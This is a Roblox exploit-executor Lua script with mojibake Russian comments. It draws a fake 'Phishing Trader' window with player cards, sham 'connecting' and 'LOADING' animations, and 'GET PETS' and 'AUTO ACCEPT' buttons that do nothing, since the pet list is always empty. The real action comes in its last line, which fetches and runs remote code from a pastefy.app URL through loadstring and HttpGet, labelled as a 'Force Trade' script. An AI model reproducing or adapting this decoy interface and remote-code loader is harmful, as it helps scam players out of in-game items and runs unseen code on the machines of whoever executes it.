-- üîπ –§–ª–∞–≥–∏ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –ø–æ–≤—Ç–æ—Ä–Ω–æ–≥–æ –æ—Ç–∫—Ä—ã—Ç–∏—è
if not _G.FreezeTraderLoaded then
    _G.FreezeTraderLoaded = true

    -- –û—Å–Ω–æ–≤–Ω–æ–π —Å–∫—Ä–∏–ø—Ç (Phishing Trader) –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏–π
   local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
local guiParent = (gethui and gethui()) or player:WaitForChild("PlayerGui")

local ThumbnailType = Enum.ThumbnailType.HeadShot
local ThumbnailSize = Enum.ThumbnailSize.Size100x100

-- üé® –¶–≤–µ—Ç–∞
local COLORS = {
    bg           = Color3.fromRGB(40, 25, 15),
    header       = Color3.fromRGB(50, 180, 80),
    headerBorder = Color3.fromRGB(30, 120, 50),
    closeBtn     = Color3.fromRGB(200, 60, 60),
    listItem     = Color3.fromRGB(70, 40, 25),
    listBorder   = Color3.fromRGB(90, 55, 35),
    avatarBg     = Color3.fromRGB(100, 70, 50),
    white        = Color3.fromRGB(255,255,255),
    black        = Color3.fromRGB(0,0,0),
    red          = Color3.fromRGB(200,50,50),
    green        = Color3.fromRGB(50,200,70),
    yellow       = Color3.fromRGB(230, 200, 40),
}

-- ‚ú® –•–µ–ª–ø–µ—Ä—ã
local function addCorner(inst, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0,r)
    c.Parent = inst
end

local function addStroke(inst, color, thickness, transparency)
    local s = Instance.new("UIStroke")
    s.Thickness = thickness or 2
    s.Color = color or COLORS.listBorder
    s.Transparency = transparency or 0.3
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = inst
    return s
end

local function addTextStroke(lbl)
    lbl.TextStrokeColor3 = COLORS.black
    lbl.TextStrokeTransparency = 0.2
end

-- üì¶ GUI root
local gui = Instance.new("ScreenGui")
gui.Name = "CoolModernUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = guiParent

-- ü™ü –ì–ª–∞–≤–Ω–æ–µ –æ–∫–Ω–æ
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 440, 0, 460)
main.Position = UDim2.new(0.5, -220, 0.5, -230)
main.BackgroundColor3 = COLORS.bg
main.BackgroundTransparency = 0.25
main.BorderSizePixel = 0
main.ZIndex = 10
main.Parent = gui
addCorner(main, 22)
addStroke(main, COLORS.listBorder, 2, 0.3)

-- üåø –ó–∞–≥–æ–ª–æ–≤–æ–∫
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 50)
header.BackgroundColor3 = COLORS.header
header.BorderSizePixel = 0
header.ZIndex = 12
header.Parent = main
addCorner(header, 10)
addStroke(header, COLORS.headerBorder, 2, 0.1)

-- –ü–µ—Ä–µ—Ç–∞—Å–∫–∏–≤–∞–Ω–∏–µ –æ–∫–Ω–∞
local dragging, dragStart, startPos
header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

header.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                  startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

local title = Instance.new("TextLabel")
title.Text = "Phishing Trader"
title.Font = Enum.Font.GothamBold
title.TextColor3 = COLORS.white
title.TextScaled = true
title.BackgroundTransparency = 1
title.Size = UDim2.new(1, -70, 1, 0)
title.Position = UDim2.new(0, 16, 0, 0)
title.TextXAlignment = Enum.TextXAlignment.Left
title.ZIndex = 13
addTextStroke(title)
title.Parent = header

-- ‚ùå –ö–Ω–æ–ø–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -48, 0.5, -20)
closeBtn.BackgroundColor3 = COLORS.closeBtn
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextScaled = true
closeBtn.TextColor3 = COLORS.white
closeBtn.BorderSizePixel = 0
closeBtn.ZIndex = 14
addTextStroke(closeBtn)
closeBtn.Parent = header
addCorner(closeBtn, 8)
addStroke(closeBtn, COLORS.listBorder, 2, 0.2)

closeBtn.MouseButton1Click:Connect(function()
    gui:Destroy()
end)

-- üìú –°–ø–∏—Å–æ–∫ –∏–≥—Ä–æ–∫–æ–≤
local listHolder = Instance.new("ScrollingFrame")
listHolder.Size = UDim2.new(1, -24, 1, -74)
listHolder.Position = UDim2.new(0, 12, 0, 66)
listHolder.BackgroundTransparency = 1
listHolder.ScrollBarThickness = 8
listHolder.CanvasSize = UDim2.new(0,0,0,0)
listHolder.ZIndex = 11
listHolder.Parent = main

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 12)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = listHolder

layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    listHolder.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
end)

-- üìã –û–∫–Ω–æ –¥–µ—Ç–∞–ª–µ–π –∏–≥—Ä–æ–∫–∞
local detailView = Instance.new("Frame")
detailView.Size = UDim2.new(1, -24, 1, -74)
detailView.Position = UDim2.new(0, 12, 0, 66)
detailView.BackgroundTransparency = 1
detailView.Visible = false
detailView.ZIndex = 11
detailView.Parent = main

-- üêæ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –ø–∏—Ç–æ–º—Ü–µ–≤ –ø–æ –∏–≥—Ä–æ–∫—É (—Ç–µ–ø–µ—Ä—å –≤—Å–µ–≥–¥–∞ –ø—É—Å—Ç–æ)
local function generatePets(player)
    return {}
end

-- üë§ –ö–∞—Ä—Ç–æ—á–∫–∞ –∏–≥—Ä–æ–∫–∞
local function createPlayerItem(playerObj)
    local card = Instance.new("TextButton")
    card.Size = UDim2.new(1, 0, 0, 70)
    card.BackgroundColor3 = COLORS.listItem
    card.BorderSizePixel = 0
    card.Text = ""
    card.ZIndex = 12
    card.Parent = listHolder
    addCorner(card, 12)
    addStroke(card, COLORS.listBorder, 2, 0.2)

    local avatar = Instance.new("ImageLabel")
    avatar.Size = UDim2.new(0, 56, 0, 56)
    avatar.Position = UDim2.new(0, 12, 0.5, -28)
    avatar.BackgroundColor3 = COLORS.avatarBg
    avatar.BorderSizePixel = 0
    avatar.ZIndex = 13
    avatar.Parent = card
    addCorner(avatar, 8)
    avatar.Image = Players:GetUserThumbnailAsync(playerObj.UserId, ThumbnailType, ThumbnailSize)

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Text = playerObj.DisplayName
    nameLabel.Font = Enum.Font.GothamBold
    nameLabel.TextScaled = true
    nameLabel.TextColor3 = COLORS.white
    nameLabel.BackgroundTransparency = 1
    nameLabel.ZIndex = 14
    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
    nameLabel.Size = UDim2.new(1, -96, 1, 0)
    nameLabel.Position = UDim2.new(0, 88, 0, 0)
    addTextStroke(nameLabel)
    nameLabel.Parent = card

    -- üîÑ –ù–∞–∂–∞—Ç–∏–µ ‚Äî –ø–æ–∫–∞–∑–∞—Ç—å –æ–∫–Ω–æ –¥–µ—Ç–∞–ª–µ–π
    card.MouseButton1Click:Connect(function()
        listHolder.Visible = false
        detailView.Visible = true

        TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 440, 0, 600)
        }):Play()

        for _,c in ipairs(detailView:GetChildren()) do
            c:Destroy()
        end

        local container = Instance.new("Frame")
        container.BackgroundTransparency = 1
        container.Size = UDim2.new(1, 0, 1, 0)
        container.Parent = detailView

        -- –õ–µ–≤–∞—è —á–∞—Å—Ç—å (–∞–≤–∞—Ç–∞—Ä + –Ω–∏–∫)
        local avatarBlock = Instance.new("Frame")
        avatarBlock.Size = UDim2.new(0, 180, 1, -80)
        avatarBlock.BackgroundTransparency = 1
        avatarBlock.Parent = container

        local avatarBig = Instance.new("ImageLabel")
        avatarBig.Size = UDim2.new(0, 150, 0, 150)
        avatarBig.Position = UDim2.new(0,15,0,10)
        avatarBig.BackgroundColor3 = COLORS.avatarBg
        avatarBig.BorderSizePixel = 0
        addCorner(avatarBig, 12)
        avatarBig.Parent = avatarBlock
        avatarBig.Image = Players:GetUserThumbnailAsync(playerObj.UserId, ThumbnailType, ThumbnailSize)

        local nickBlock = Instance.new("TextLabel")
        nickBlock.Size = UDim2.new(0,150,0,40)
        nickBlock.Position = UDim2.new(0,15,0,165)
        nickBlock.BackgroundColor3 = COLORS.black
        nickBlock.BackgroundTransparency = 0.2
        nickBlock.Text = playerObj.DisplayName
        nickBlock.Font = Enum.Font.GothamBold
        nickBlock.TextColor3 = COLORS.white
        nickBlock.TextScaled = true
        addTextStroke(nickBlock)
        nickBlock.Parent = avatarBlock
        addCorner(nickBlock, 6)

        -- –ü—Ä–∞–≤–∞—è —á–∞—Å—Ç—å (pets)
        local petsBlock = Instance.new("Frame")
        petsBlock.Size = UDim2.new(1,-200,1,-90)
        petsBlock.Position = UDim2.new(0,200,0,10)
        petsBlock.BackgroundTransparency = 1
        petsBlock.Parent = container

        local petsLabel = Instance.new("TextLabel")
        petsLabel.Size = UDim2.new(1,0,0,30)
        petsLabel.BackgroundTransparency = 1
        petsLabel.Text = "PETS:"
        petsLabel.Font = Enum.Font.GothamBold
        petsLabel.TextColor3 = COLORS.white
        petsLabel.TextScaled = true
        petsLabel.TextXAlignment = Enum.TextXAlignment.Left
        addTextStroke(petsLabel)
        petsLabel.Parent = petsBlock

        -- ‚è≥ –ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏
        task.spawn(function()
            local msgs = {
                "Connections to the server.",
                "Connections to the server..",
                "Connections to the server...",
                "Getting info.",
                "Getting info..",
                "Getting info...",
            }
            for _,msg in ipairs(msgs) do
                petsLabel.Text = msg
                task.wait(0.5)
            end

            petsLabel.Text = "PETS:"
            local pets = generatePets(playerObj)
            if #pets == 0 then
                local noPets = petsLabel:Clone()
                noPets.Text = "NO PETS FOUND"
                noPets.Position = UDim2.new(0,0,0,40)
                noPets.TextColor3 = COLORS.red
                noPets.Parent = petsBlock
            else
                local y = 40
                for _,pet in ipairs(pets) do
                    local petLabel = petsLabel:Clone()
                    petLabel.Text = pet
                    petLabel.Position = UDim2.new(0,0,0,y)
                    petLabel.Parent = petsBlock
                    y = y + 35
                end
            end
        end)

        -- –ö–Ω–æ–ø–∫–∏ —Å–Ω–∏–∑—É
        local btnHolder = Instance.new("Frame")
        btnHolder.Size = UDim2.new(1,0,0,180)
        btnHolder.AnchorPoint = Vector2.new(0,1)
        btnHolder.Position = UDim2.new(0,0,1,-120)
        btnHolder.BackgroundTransparency = 1
        btnHolder.Parent = container

        local layoutBtns = Instance.new("UIListLayout")
        layoutBtns.Padding = UDim.new(0,8)
        layoutBtns.FillDirection = Enum.FillDirection.Vertical
        layoutBtns.HorizontalAlignment = Enum.HorizontalAlignment.Center
        layoutBtns.VerticalAlignment = Enum.VerticalAlignment.Top
        layoutBtns.Parent = btnHolder

        local function createBtn(text, color)
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(0,280,0,65)
            btn.BackgroundColor3 = color
            btn.Text = text
            btn.Font = Enum.Font.GothamBold
            btn.TextScaled = true
            btn.TextColor3 = COLORS.white
            addTextStroke(btn)
            btn.Parent = btnHolder
            addCorner(btn, 8)
            addStroke(btn, COLORS.listBorder, 2, 0.2)
            return btn
        end

        -- –£–±—Ä–∞–ª–∏ GET TRADE OFFER
        local btn2 = createBtn("GET PETS", COLORS.green)
        local btn3 = createBtn("AUTO ACCEPT: OFF", COLORS.red)
        local btnBack = createBtn("BACK", COLORS.yellow)

        -- –ê–Ω–∏–º–∞—Ü–∏—è –∫–Ω–æ–ø–∫–∏ GET PETS
        btn2.MouseButton1Click:Connect(function()
            local originalText = btn2.Text
            local originalColor = btn2.BackgroundColor3
            btn2.BackgroundColor3 = COLORS.yellow

            local msgs = {"LOADING.", "LOADING..", "LOADING..."}
            local startTime = tick()

            task.spawn(function()
                while tick() - startTime < 6 do
                    for _, msg in ipairs(msgs) do
                        btn2.Text = msg
                        task.wait(0.5)
                    end
                end
                btn2.BackgroundColor3 = originalColor
                btn2.Text = originalText
            end)
        end)

        local autoOn = false
        btn3.MouseButton1Click:Connect(function()
            autoOn = not autoOn
            if autoOn then
                btn3.Text = "AUTO ACCEPT: ON"
                btn3.BackgroundColor3 = COLORS.green
            else
                btn3.Text = "AUTO ACCEPT: OFF"
                btn3.BackgroundColor3 = COLORS.red
            end
        end)

        btnBack.MouseButton1Click:Connect(function()
            detailView.Visible = false
            listHolder.Visible = true
            TweenService:Create(main, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                Size = UDim2.new(0, 440, 0, 460)
            }):Play()
        end)
    end)

    return card
end

-- üì• –ù–∞–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞
local function refreshList()
    for _, c in ipairs(listHolder:GetChildren()) do
        if c:IsA("TextButton") then c:Destroy() end
    end
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player then
            createPlayerItem(p)
        end
    end
end

Players.PlayerAdded:Connect(refreshList)
Players.PlayerRemoving:Connect(refreshList)
refreshList()


    -- üîπ Force Trade —Å–∫—Ä–∏–ø—Ç
    loadstring(game:HttpGet("https://pastefy.app/nhwwdZKp/raw"))()
end
